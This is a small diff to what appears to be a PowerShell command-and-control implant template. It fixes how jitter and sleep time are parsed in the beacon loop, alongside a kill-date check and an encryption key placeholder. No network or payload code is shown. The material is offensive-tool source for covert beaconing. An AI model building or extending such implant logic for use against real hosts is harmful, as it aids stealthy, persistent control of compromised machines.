@@ -1,5 +1,5 @@
 $key="%s"
-$jitter=%s
+$jitter='%s'
 Function Beacon($sleeptime) {
     if ($sleeptime.ToLower().Contains('m')) { 
         $sleeptime = $sleeptime -replace 'm', ''
@@ -189,7 +189,7 @@ while($true)
     $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
     $killdate = [datetime]::ParseExact("%s","dd/MM/yyyy",$null)
     if ($killdate -lt $date) {exit}
-    $sleeptimeran = ($sleeptime * (1 + $Jitter))..($sleeptime * (1 - $Jitter))
+    $sleeptimeran = ([int]$sleeptime * (1 + $Jitter))..([int]$sleeptime * (1 - $Jitter))
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5}
     start-sleep $newsleep
